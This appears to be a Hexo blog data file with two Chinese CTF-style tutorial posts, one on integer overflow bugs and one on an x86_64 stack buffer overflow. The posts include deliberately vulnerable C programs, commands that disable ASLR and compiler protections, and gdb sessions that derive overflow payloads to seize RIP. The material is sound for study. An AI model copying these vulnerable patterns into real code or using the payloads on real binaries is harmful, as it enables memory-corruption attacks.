{"meta":{"title":"技术栈","subtitle":"Share station","description":"Here, you will make progress together!","author":"rgzzplus","url":"https://www.rgzzplus.com","root":"/"},"pages":[{"title":"关于","date":"2022-03-19T15:37:13.720Z","updated":"2022-03-19T15:37:13.720Z","comments":true,"path":"about/index.html","permalink":"https://www.rgzzplus.com/about/index.html","excerpt":"","text":"一个平平无奇的在校大学牲，奋发努力的朝着网络安全大坑迈进。"},{"title":"分类","date":"2022-03-11T07:26:02.830Z","updated":"2022-03-11T07:26:02.830Z","comments":false,"path":"categories/index.html","permalink":"https://www.rgzzplus.com/categories/index.html","excerpt":"","text":""},{"title":"404 Not Found：该页无法显示","date":"2022-03-11T07:26:02.826Z","updated":"2022-03-11T07:26:02.826Z","comments":false,"path":"/404.html","permalink":"https://www.rgzzplus.com/404.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-03-16T06:34:32.173Z","updated":"2022-03-16T06:34:32.173Z","comments":true,"path":"links/index.html","permalink":"https://www.rgzzplus.com/links/index.html","excerpt":"","text":""},{"title":"书单","date":"2022-03-11T07:26:02.829Z","updated":"2022-03-11T07:26:02.829Z","comments":false,"path":"books/index.html","permalink":"https://www.rgzzplus.com/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-03-11T07:47:58.721Z","updated":"2022-03-11T07:26:02.832Z","comments":false,"path":"repository/index.html","permalink":"https://www.rgzzplus.com/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-03-11T07:26:02.833Z","updated":"2022-03-11T07:26:02.833Z","comments":false,"path":"tags/index.html","permalink":"https://www.rgzzplus.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"整数安全","slug":"整数安全","date":"2022-08-27T04:48:59.000Z","updated":"2022-08-27T04:49:22.367Z","comments":true,"path":"2022/08/27/整数安全/","link":"","permalink":"https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/","excerpt":"","text":"[TOC] 1. 什么是整数溢出 1.1 简介 在 C 语言基础的章节中，我们介绍了 C 语言整数的基础知识，下面我们详细介绍整数的安全问题。 由于整数在内存里面保存在一个固定长度的空间内，它能存储的最大值和最小值是固定的，如果我们尝试去存储一个数，而这个数又大于这个固定的最大值时，就会导致整数溢出。（x86-32 的数据模型是 ILP32，即整数（Int）、长整数（Long）和指针（Pointer）都是 32 位。） 1.2 整数溢出的危害 如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出出现之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。 2. 整数溢出 关于整数的异常情况主要有三种： 溢出 只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出 溢出标志 OF 可检测有符号数的溢出 回绕 无符号数 0-1 时会变成最大的数，如 1 字节的无符号数会变为 255，而 255+1 会变成最小数 0。 进位标志 CF 可检测无符号数的回绕 截断 将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断 2.1 有符号整数溢出 上溢出 1234int i;i = INT_MAX; // 2 147 483 647i++;printf(&quot;i = %d\\n&quot;, i); // i = -2 147 483 648 下溢出 123i = INT_MIN; // -2 147 483 648i--;printf(&quot;i = %d\\n&quot;, i); // i = 2 147 483 647 2.2 无符号数回绕 涉及无符号数的计算永远不会溢出，因为不能用结果为无符号整数表示的结果值被该类型可以表示的最大值加 1 之和取模减（reduced modulo）。因为回绕，一个无符号整数表达式永远无法求出小于零的值。 使用下图直观地理解回绕，在轮上按顺时针方向将值递增产生的值紧挨着它： 1234567unsigned int ui;ui = UINT_MAX; // 在 x86-32 上为 4 294 967 295ui++;printf(&quot;ui = %u\\n&quot;, ui); // ui = 0ui = 0;ui--;printf(&quot;ui = %u\\n&quot;, ui); // 在 x86-32 上，ui = 4 294 967 295 2.3 截断 加法截断： 1230xffffffff + 0x00000001= 0x0000000100000000 (long long)= 0x00000000 (long) 乘法截断： 1230x00123456 * 0x00654321= 0x000007336BF94116 (long long)= 0x6BF94116 (long) 2.4 整型提升和宽度溢出 整型提升是指当计算表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。 123456789101112131415161718#include&lt;stdio.h&gt;void main() &#123; int l; short s; char c; l = 0xabcddcba; s = l; c = l; printf(&quot;宽度溢出\\n&quot;); printf(&quot;l = 0x%x (%d bits)\\n&quot;, l, sizeof(l) * 8); printf(&quot;s = 0x%x (%d bits)\\n&quot;, s, sizeof(s) * 8); printf(&quot;c = 0x%x (%d bits)\\n&quot;, c, sizeof(c) * 8); printf(&quot;整型提升\\n&quot;); printf(&quot;s + c = 0x%x (%d bits)\\n&quot;, s+c, sizeof(s+c) * 8);&#125; 1234567$ ./a.out宽度溢出l = 0xabcddcba (32 bits)s = 0xffffdcba (16 bits)c = 0xffffffba (8 bits)整型提升s + c = 0xffffdc74 (32 bits) 使用 gdb 查看反汇编代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445gdb-peda$ disassemble mainDump of assembler code for function main: 0x0000000000001169 &lt;+0&gt;: endbr64 0x000000000000116d &lt;+4&gt;: push rbp 0x000000000000116e &lt;+5&gt;: mov rbp,rsp 0x0000000000001171 &lt;+8&gt;: sub rsp,0x10 0x0000000000001175 &lt;+12&gt;: mov DWORD PTR [rbp-0x4],0xabcddcba 0x000000000000117c &lt;+19&gt;: mov eax,DWORD PTR [rbp-0x4] 0x000000000000117f &lt;+22&gt;: mov WORD PTR [rbp-0x6],ax 0x0000000000001183 &lt;+26&gt;: mov eax,DWORD PTR [rbp-0x4] 0x0000000000001186 &lt;+29&gt;: mov BYTE PTR [rbp-0x7],al 0x0000000000001189 &lt;+32&gt;: lea rdi,[rip+0xe74] # 0x2004 0x0000000000001190 &lt;+39&gt;: call 0x1060 &lt;puts@plt&gt; 0x0000000000001195 &lt;+44&gt;: mov eax,DWORD PTR [rbp-0x4] 0x0000000000001198 &lt;+47&gt;: mov edx,0x20 0x000000000000119d &lt;+52&gt;: mov esi,eax 0x000000000000119f &lt;+54&gt;: lea rdi,[rip+0xe6b] # 0x2011 0x00000000000011a6 &lt;+61&gt;: mov eax,0x0 0x00000000000011ab &lt;+66&gt;: call 0x1070 &lt;printf@plt&gt; 0x00000000000011b0 &lt;+71&gt;: movsx eax,WORD PTR [rbp-0x6] 0x00000000000011b4 &lt;+75&gt;: mov edx,0x10 0x00000000000011b9 &lt;+80&gt;: mov esi,eax 0x00000000000011bb &lt;+82&gt;: lea rdi,[rip+0xe63] # 0x2025 0x00000000000011c2 &lt;+89&gt;: mov eax,0x0 0x00000000000011c7 &lt;+94&gt;: call 0x1070 &lt;printf@plt&gt; 0x00000000000011cc &lt;+99&gt;: movsx eax,BYTE PTR [rbp-0x7] 0x00000000000011d0 &lt;+103&gt;: mov edx,0x8 0x00000000000011d5 &lt;+108&gt;: mov esi,eax 0x00000000000011d7 &lt;+110&gt;: lea rdi,[rip+0xe5b] # 0x2039 0x00000000000011de &lt;+117&gt;: mov eax,0x0 0x00000000000011e3 &lt;+122&gt;: call 0x1070 &lt;printf@plt&gt; 0x00000000000011e8 &lt;+127&gt;: lea rdi,[rip+0xe5e] # 0x204d 0x00000000000011ef &lt;+134&gt;: call 0x1060 &lt;puts@plt&gt; 0x00000000000011f4 &lt;+139&gt;: movsx edx,WORD PTR [rbp-0x6] 0x00000000000011f8 &lt;+143&gt;: movsx eax,BYTE PTR [rbp-0x7] 0x00000000000011fc &lt;+147&gt;: add eax,edx 0x00000000000011fe &lt;+149&gt;: mov edx,0x20 0x0000000000001203 &lt;+154&gt;: mov esi,eax 0x0000000000001205 &lt;+156&gt;: lea rdi,[rip+0xe4e] # 0x205a 0x000000000000120c &lt;+163&gt;: mov eax,0x0 0x0000000000001211 &lt;+168&gt;: call 0x1070 &lt;printf@plt&gt; 0x0000000000001216 &lt;+173&gt;: nop 0x0000000000001217 &lt;+174&gt;: leave 0x0000000000001218 &lt;+175&gt;: ret End of assembler dump. 在整数转换的过程中，有可能导致下面的错误： 损失值：转换为值的大小不能表示的一种类型 损失符号：从有符号类型转换为无符号类型，导致损失符号 2.5 漏洞多发函数 我们说过整数溢出要配合上其他类型的缺陷才能有用，下面的两个函数都有一个 size_t 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。 123#include &lt;string.h&gt;void *memcpy(void *dest, const void *src, size_t n); memcpy() 函数将 src 所指向的字符串中以 src 地址开始的前 n 个字节复制到 dest 所指的数组中，并返回 dest。 123#include &lt;string.h&gt;char *strncpy(char *dest, const char *src, size_t n); strncpy() 函数从源 src 所指的内存地址的起始位置开始复制 n 个字节到目标 dest 所指的内存地址的起始位置中。 两个函数中都有一个类型为 size_t 的参数，它是无符号整型的 sizeof 运算符的结果。 1typedef unsigned int size_t; 3. 整数溢出示例 现在我们已经知道了整数溢出的原理和主要形式，下面我们先看几个简单示例，然后实际操作利用一个整数溢出漏洞。 3.1 示例 示例一，整数转换： 12345678910char buf[80];void vulnerable() &#123; int len = read_int_from_network(); char *p = read_string_from_network(); if (len &gt; 80) &#123; error(&quot;length too large: bad dog, no cookie for you!&quot;); return; &#125; memcpy(buf, p, len);&#125; 这个例子的问题在于，如果攻击者给 len 赋于了一个负数，则可以绕过 if 语句的检测，而执行到 memcpy() 的时候，由于第三个参数是 size_t 类型，负数 len 会被转换为一个无符号整型，它可能是一个非常大的正数，从而复制了大量的内容到 buf 中，引发了缓冲区溢出。 示例二，回绕和溢出： 12345678910void vulnerable() &#123; size_t len; // int len; char* buf; len = read_int_from_network(); buf = malloc(len + 5); read(fd, buf, len); ...&#125; 这个例子看似避开了缓冲区溢出的问题，但是如果 len 过大，len+5 有可能发生回绕。比如说，在 x86-32 上，如果 len = 0xFFFFFFFF，则 len+5 = 0x00000004，这时 malloc() 只分配了 4 字节的内存区域，然后在里面写入大量的数据，缓冲区溢出也就发生了。（如果将 len 声明为有符号 int 类型，len+5 可能发生溢出） 示例三，截断： 12345678void main(int argc, char *argv[]) &#123; unsigned short int total; total = strlen(argv[1]) + strlen(argv[2]) + 1; char *buf = (char *)malloc(total); strcpy(buf, argv[1]); strcat(buf, argv[2]); ...&#125; 这个例子接受两个字符串类型的参数并计算它们的总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串参数复制到缓冲区中，然后将第二个参数连接到尾部。如果攻击者提供的两个字符串总长度无法用 total 表示，则会发生截断，从而导致后面的缓冲区溢出。 12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt;void validate_passwd(char *passwd) &#123; char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); if(passwd_len &gt;= 4 &amp;&amp; passwd_len &lt;= 8) &#123; printf(&quot;good!\\n&quot;); strcpy(passwd_buf, passwd); &#125; else &#123; printf(&quot;bad!\\n&quot;); &#125;&#125;int main(int argc, char *argv[]) &#123; validate_passwd(argv[1]);&#125; 上面的程序中 strlen() 返回类型是 size_t，却被存储在无符号字符串类型中，任意超过无符号字符串最大上限值（256 字节）的数据都会导致截断异常。当密码长度为 261 时，截断后值变为 5，成功绕过了 if 的判断，导致栈溢出。下面我们利用溢出漏洞来获得 shell。 编译命令： 12345# echo 0&gt; /proc/sys/kernel/randomize_va_space$ gcc -g -fno-stack-protector -z execstack -o vuln vuln.c$ sudo chown root vuln$ sudo chgrp root vuln$ sudo chmod +s vuln 使用 gdb 反汇编 validate_passwd 函数。rdi,rsi,rdx,rcx,r8,r9 123456789101112131415161718192021222324252627282930gdb-peda$ disassemble validate_passwdDump of assembler code for function validate_passwd: 0x0000000000001189 &lt;+0&gt;: endbr64 0x000000000000118d &lt;+4&gt;: push rbp ; 压入ebp 0x000000000000118e &lt;+5&gt;: mov rbp,rsp 0x0000000000001191 &lt;+8&gt;: sub rsp,0x20 0x0000000000001195 &lt;+12&gt;: mov QWORD PTR [rbp-0x18],rdi 0x0000000000001199 &lt;+16&gt;: mov rax,QWORD PTR [rbp-0x18] 0x000000000000119d &lt;+20&gt;: mov rdi,rax 0x00000000000011a0 &lt;+23&gt;: call 0x1090 &lt;strlen@plt&gt; 0x00000000000011a5 &lt;+28&gt;: mov BYTE PTR [rbp-0x1],al ; 将len存入[rbp-0x1] 0x00000000000011a8 &lt;+31&gt;: cmp BYTE PTR [rbp-0x1],0x3 0x00000000000011ac &lt;+35&gt;: jbe 0x11d5 &lt;validate_passwd+76&gt; 0x00000000000011ae &lt;+37&gt;: cmp BYTE PTR [rbp-0x1],0x8 0x00000000000011b2 &lt;+41&gt;: ja 0x11d5 &lt;validate_passwd+76&gt; 0x00000000000011b4 &lt;+43&gt;: lea rdi,[rip+0xe49] # 0x2004 0x00000000000011bb &lt;+50&gt;: call 0x1080 &lt;puts@plt&gt; 0x00000000000011c0 &lt;+55&gt;: mov rdx,QWORD PTR [rbp-0x18] 0x00000000000011c4 &lt;+59&gt;: lea rax,[rbp-0xc] ; 取passwd_buf地址 0x00000000000011c8 &lt;+63&gt;: mov rsi,rdx ; 传入参数passwd_buf 0x00000000000011cb &lt;+66&gt;: mov rdi,rax 0x00000000000011ce &lt;+69&gt;: call 0x1070 &lt;strcpy@plt&gt; 0x00000000000011d3 &lt;+74&gt;: jmp 0x11e2 &lt;validate_passwd+89&gt; 0x00000000000011d5 &lt;+76&gt;: lea rdi,[rip+0xe2e] # 0x200a 0x00000000000011dc &lt;+83&gt;: call 0x1080 &lt;puts@plt&gt; 0x00000000000011e1 &lt;+88&gt;: nop 0x00000000000011e2 &lt;+89&gt;: nop 0x00000000000011e3 &lt;+90&gt;: leave 0x00000000000011e4 &lt;+91&gt;: ret End of assembler dump. 通过阅读反汇编代码，我们知道缓冲区 passwd_buf 位于 rbp-0xc 的位置（0x00000000000011c4&lt;+71&gt;: lea eax,[rbp-0xc]），而返回地址在 rbp+8 的位置，所以返回地址相对于缓冲区 0x14 的位置。我们测试一下： 123gef$ r `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`Starting program: /home/sakura/文档/vuln `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`good! 可以看到 EIP 被 BBBBBBBB 覆盖，相当于我们获得了返回地址的控制权。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"整数安全","slug":"整数安全","permalink":"https://www.rgzzplus.com/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"}]},{"title":"栈溢出x86_64","slug":"栈溢出x86-64","date":"2022-08-27T04:45:51.000Z","updated":"2022-08-27T04:47:22.175Z","comments":true,"path":"2022/08/27/栈溢出x86-64/","link":"","permalink":"https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/","excerpt":"","text":"[TOC] 1. x86和x86_64的区别 第一个主要区别就是内存地址的大小。这没啥可惊奇的: 不过即便内存地址有64位长用户空间也只能使用前47位，要牢记这点因为当你指定一个大于0x00007fffffffffff的地址时会抛出一个异常。那也就意味着0x4141414141414141会抛出异常而0x0000414141414141是安全的。当你在进行模糊测试或编写利用程序的时候我觉得这是个很巧妙的部分。 事实上还有很多其他的不同但是考虑到本文的目的不了解所有的差异也没关系。 2. 漏洞代码片段 123456789101112//bof.c#include&lt;stdio.h&gt;int main(int argc, char **argv) &#123; char buffer[256]; if(argc != 2) &#123; exit(0); &#125; printf(&quot;%p\\n&quot;, buffer); strcpy(buffer, argv[1]); printf(&quot;%s\\n&quot;, buffer); return 0;&#125; 做实验首先要注意： 1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（需要管理员权限） 1# echo 0 &gt; /proc/sys/kernel/randomize_va_space 2.编译时关闭CANARY，PIE等栈相关保护。 1sakura@Kylin:~/文档/overflow$ gcc bof.c -o bof -z execstack -fno-stack-protector -g 3. 触发漏洞 1234sakura@Kylin:~/文档/overflow$ ./bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)0x7fffffffddb0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA段错误 (核心已转储) 我们用 gdb 调试一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687sakura@Kylin:~/文档/overflow$ gdb-gef bofgef➤ disassemble mainDump of assembler code for function main: 0x00005555555551a9 &lt;+0&gt;: endbr64 0x00005555555551ad &lt;+4&gt;: push rbp 0x00005555555551ae &lt;+5&gt;: mov rbp,rsp 0x00005555555551b1 &lt;+8&gt;: sub rsp,0x110 0x00005555555551b8 &lt;+15&gt;: mov DWORD PTR [rbp-0x104],edi 0x00005555555551be &lt;+21&gt;: mov QWORD PTR [rbp-0x110],rsi 0x00005555555551c5 &lt;+28&gt;: cmp DWORD PTR [rbp-0x104],0x2 0x00005555555551cc &lt;+35&gt;: je 0x5555555551d8 &lt;main+47&gt; 0x00005555555551ce &lt;+37&gt;: mov edi,0x0 0x00005555555551d3 &lt;+42&gt;: call 0x5555555550b0 &lt;exit@plt&gt; 0x00005555555551d8 &lt;+47&gt;: lea rax,[rbp-0x100] 0x00005555555551df &lt;+54&gt;: mov rsi,rax 0x00005555555551e2 &lt;+57&gt;: lea rdi,[rip+0xe1b] # 0x555555556004 0x00005555555551e9 &lt;+64&gt;: mov eax,0x0 0x00005555555551ee &lt;+69&gt;: call 0x5555555550a0 &lt;printf@plt&gt; 0x00005555555551f3 &lt;+74&gt;: mov rax,QWORD PTR [rbp-0x110] 0x00005555555551fa &lt;+81&gt;: add rax,0x8 0x00005555555551fe &lt;+85&gt;: mov rdx,QWORD PTR [rax] 0x0000555555555201 &lt;+88&gt;: lea rax,[rbp-0x100] 0x0000555555555208 &lt;+95&gt;: mov rsi,rdx 0x000055555555520b &lt;+98&gt;: mov rdi,rax 0x000055555555520e &lt;+101&gt;: call 0x555555555080 &lt;strcpy@plt&gt; 0x0000555555555213 &lt;+106&gt;: lea rax,[rbp-0x100] 0x000055555555521a &lt;+113&gt;: mov rdi,rax 0x000055555555521d &lt;+116&gt;: call 0x555555555090 &lt;puts@plt&gt; 0x0000555555555222 &lt;+121&gt;: mov eax,0x0 0x0000555555555227 &lt;+126&gt;: leave =&gt; 0x0000555555555228 &lt;+127&gt;: ret End of assembler dump.gef➤ b strcpygef➤ b putsgef➤ r $(python -c &#x27;print &quot;A&quot; * 300&#x27;)Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print &quot;A&quot; * 300&#x27;)0x7fffffffdd40AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 2, 0x00007ffff7e3a420 in puts () from /lib/x86_64-linux-gnu/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x00007fffffffdd40 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;$rbx : 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0x0 $rdx : 0x16 $rsp : 0x00007fffffffdd28 → 0x0000555555555222 → &lt;main+121&gt; mov eax, 0x0$rbp : 0x00007fffffffde40 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;$rsi : 0x00007fffffffe3c0 → &quot;AAAAAAAAAAAAAAAAAAAAAA&quot;$rdi : 0x00007fffffffdd40 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;$rip : 0x00007ffff7e3a420 → &lt;puts+0&gt; endbr64 $r8 : 0x0 $r9 : 0xf $r10 : 0x0000555555556006 → 0x00443b031b01000a (&quot;\\n&quot;?)$r11 : 0x246 $r12 : 0x00005555555550c0 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffdf30 → 0x0000000000000002$r14 : 0x0 $r15 : 0x0 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffdd28│+0x0000: 0x0000555555555222 → &lt;main+121&gt; mov eax, 0x0 ← $rsp0x00007fffffffdd30│+0x0008: 0x00007fffffffdf38 → 0x00007fffffffe289 → 0x61732f656d6f682f0x00007fffffffdd38│+0x0010: 0x00000002000003400x00007fffffffdd40│+0x0018: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot; ← $rax, $rdi0x00007fffffffdd48│+0x0020: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;0x00007fffffffdd50│+0x0028: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;0x00007fffffffdd58│+0x0030: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;0x00007fffffffdd60│+0x0038: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x7ffff7e3a40f &lt;popen+143&gt; jmp 0x7ffff7e3a3e4 &lt;popen+100&gt; 0x7ffff7e3a411 nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7e3a41b nop DWORD PTR [rax+rax*1+0x0] → 0x7ffff7e3a420 &lt;puts+0&gt; endbr64 0x7ffff7e3a424 &lt;puts+4&gt; push r14 0x7ffff7e3a426 &lt;puts+6&gt; push r13 0x7ffff7e3a428 &lt;puts+8&gt; push r12 0x7ffff7e3a42a &lt;puts+10&gt; mov r12, rdi 0x7ffff7e3a42d &lt;puts+13&gt; push rbp─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;bof&quot;, stopped 0x7ffff7e3a420 in puts (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x7ffff7e3a420 → puts()[#1] 0x555555555222 → main(argc=0x2, argv=0x7fffffffdf38)────────────────────────────────────────────────────────────────────────────────gef➤ 我们发现，明明在 strcpy 上也下了断点，可是并未停止，不知道为什么我们 r 后，直接就在 puts 处停止了。过了 strcpy 调用之后你会发现当前缓冲区指针指向 0x00007fffffffdd40 而不是 0x7fffffffddb0 这是gdb的环境变量和其他东西造成的。不过现在我们不关心之后会解决的，继续向下看 si 到 ret 指令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354gef➤ finish......gef➤ si0x0000555555555228 14 &#125;[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0x00007ffff7ec4077 → 0x5177fffff0003d48 (&quot;H=&quot;?)$rdx : 0x0 $rsp : 0x00007fffffffde48 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;$rbp : 0x4141414141414141 (&quot;AAAAAAAA&quot;?)$rsi : 0x00005555555592a0 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;$rdi : 0x00007ffff7fa47e0 → 0x0000000000000000$rip : 0x0000555555555228 → &lt;main+127&gt; ret $r8 : 0x12d $r9 : 0xf $r10 : 0x0000555555556006 → 0x00443b031b01000a (&quot;\\n&quot;?)$r11 : 0x246 $r12 : 0x00005555555550c0 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffdf30 → 0x0000000000000002$r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffde48│+0x0000: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; ← $rsp0x00007fffffffde50│+0x0008: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;0x00007fffffffde58│+0x0010: &quot;AAAAAAAAAAAAAAAAAAAA&quot;0x00007fffffffde60│+0x0018: &quot;AAAAAAAAAAAA&quot;0x00007fffffffde68│+0x0020: 0x0000550041414141 (&quot;AAAA&quot;?)0x00007fffffffde70│+0x0028: 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 0x00007fffffffde78│+0x0030: 0x395b03b9e69a9ef50x00007fffffffde80│+0x0038: 0x00005555555550c0 → &lt;_start+0&gt; endbr64 ─────────────────────────────────────────────────────────────── code:x86:64 ──── 0x55555555521d &lt;main+116&gt; call 0x555555555090 &lt;puts@plt&gt; 0x555555555222 &lt;main+121&gt; mov eax, 0x0 0x555555555227 &lt;main+126&gt; leave → 0x555555555228 &lt;main+127&gt; ret [!] Cannot disassemble from $PC─────────────────────────────────────────────────────────── source:bof.c+14 ──── 9 &#125; 10 printf(&quot;%p\\n&quot;, buffer); 11 strcpy(buffer, argv[1]); 12 printf(&quot;%s\\n&quot;, buffer); 13 return 0; → 14 &#125;─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;bof&quot;, stopped 0x555555555228 in main (), reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf38)────────────────────────────────────────────────────────────────────────────────gef➤ 当执行 ret 时，rsp ---&gt; 0x4141414141414141，我们没能控制 RIP 为什么因为我们覆盖了太多位，最大的地址是 0x00007fffffffffff 而我们尝试用 0x4141414141414141 去溢出了。 4. 控制RIP 为了解决这个问题，我们可以用个小一点的缓冲区去溢出这样指向 rsp 的地址就会像 0x0000414141414141 一样了。 通过简单的数学运算就可以很轻松地算出我们缓冲区的大小。我们知道缓冲区开始于 0x00007fffffffdd40 。strcpy 之后 rsp 将指向 0x00007fffffffde48。 10x00007fffffffde48 - 0x00007fffffffdd40 = 0x108 -&gt; 十进制的264 知道了这些我们可以把溢出载荷修改成这样 1&quot;A&quot; * 264 + &quot;B&quot; * 6 rsp指向的地址应该是 0x0000424242424242 ，那样就能控制RIP。 1234567891011121314151617181920212223242526272829303132333435363738[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax : 0x0 $rbx : 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 $rcx : 0x00007ffff7ec4077 → 0x5177fffff0003d48 (&quot;H=&quot;?)$rdx : 0x0 $rsp : 0x00007fffffffde70 → 0x00007ffff7ffc620 → 0x00050a3600000000$rbp : 0x4141414141414141 (&quot;AAAAAAAA&quot;?)$rsi : 0x00005555555592a0 → &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;$rdi : 0x00007ffff7fa47e0 → 0x0000000000000000$rip : 0x424242424242 $r8 : 0x10f $r9 : 0xf $r10 : 0x0000555555556006 → 0x00443b031b01000a (&quot;\\n&quot;?)$r11 : 0x246 $r12 : 0x00005555555550c0 → &lt;_start+0&gt; endbr64 $r13 : 0x00007fffffffdf50 → 0x0000000000000002$r14 : 0x0 $r15 : 0x0 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ───────────────────────────────────────────────────────────────────── stack ────0x00007fffffffde70│+0x0000: 0x00007ffff7ffc620 → 0x00050a3600000000 ← $rsp0x00007fffffffde78│+0x0008: 0x00007fffffffdf58 → 0x00007fffffffe2a7 → 0x61732f656d6f682f0x00007fffffffde80│+0x0010: 0x00000002000000000x00007fffffffde88│+0x0018: 0x00005555555551a9 → &lt;main+0&gt; endbr64 0x00007fffffffde90│+0x0020: 0x0000555555555230 → &lt;__libc_csu_init+0&gt; endbr64 0x00007fffffffde98│+0x0028: 0xbdf64f9ef20c1d5a0x00007fffffffdea0│+0x0030: 0x00005555555550c0 → &lt;_start+0&gt; endbr64 0x00007fffffffdea8│+0x0038: 0x00007fffffffdf50 → 0x0000000000000002─────────────────────────────────────────────────────────────── code:x86:64 ────[!] Cannot disassemble from $PC[!] Cannot access memory at address 0x424242424242─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;bof&quot;, stopped 0x424242424242 in ?? (), reason: 